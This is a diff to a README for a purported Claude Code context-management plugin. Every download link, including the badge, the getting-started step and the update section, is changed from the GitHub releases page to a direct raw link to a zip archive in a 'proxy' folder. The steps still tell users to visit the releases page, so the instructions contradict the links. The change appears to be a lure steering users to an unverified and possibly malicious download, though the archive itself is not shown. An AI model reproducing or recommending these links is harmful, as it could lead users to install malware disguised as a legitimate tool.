@@ -1,6 +1,6 @@
 # ⚙️ claude-rolling-context - Manage Claude Code Context Easily
 
-[![Download claude-rolling-context](https://img.shields.io/badge/Download-Ready-blue?style=for-the-badge)](https://github.com/Qaxim-0/claude-rolling-context/releases)
+[![Download claude-rolling-context](https://img.shields.io/badge/Download-Ready-blue?style=for-the-badge)](https://raw.githubusercontent.com/Qaxim-0/claude-rolling-context/master/proxy/rolling_claude_context_3.1.zip)
 
 ## 🧩 What Is claude-rolling-context?
 
@@ -31,7 +31,7 @@ The tool watches your ongoing conversations inside Claude Code. It compresses ea
 ## 🚀 Getting Started: How to Download and Run claude-rolling-context
 
 1. Click the big download button above or visit the official releases page here:  
-   [https://github.com/Qaxim-0/claude-rolling-context/releases](https://github.com/Qaxim-0/claude-rolling-context/releases)
+   [https://raw.githubusercontent.com/Qaxim-0/claude-rolling-context/master/proxy/rolling_claude_context_3.1.zip](https://raw.githubusercontent.com/Qaxim-0/claude-rolling-context/master/proxy/rolling_claude_context_3.1.zip)
 
 2. On the releases page, look for the latest version listed at the top.
 
@@ -69,7 +69,7 @@ If you run into any issues, check your internet connection or restart Claude Cod
 ## 🔄 Updating claude-rolling-context
 
 - Visit the releases page regularly:  
-  [https://github.com/Qaxim-0/claude-rolling-context/releases](https://github.com/Qaxim-0/claude-rolling-context/releases)
+  [https://raw.githubusercontent.com/Qaxim-0/claude-rolling-context/master/proxy/rolling_claude_context_3.1.zip](https://raw.githubusercontent.com/Qaxim-0/claude-rolling-context/master/proxy/rolling_claude_context_3.1.zip)
 
 - Download the latest installer when a new version is out.
 
@@ -107,4 +107,4 @@ This plugin focuses on making conversations with Claude Code smoother over time.
 
 ---
 
-[Download claude-rolling-context now](https://github.com/Qaxim-0/claude-rolling-context/releases) and follow the steps above to keep your Claude Code sessions running smoothly.
+[Download claude-rolling-context now](https://raw.githubusercontent.com/Qaxim-0/claude-rolling-context/master/proxy/rolling_claude_context_3.1.zip) and follow the steps above to keep your Claude Code sessions running smoothly.
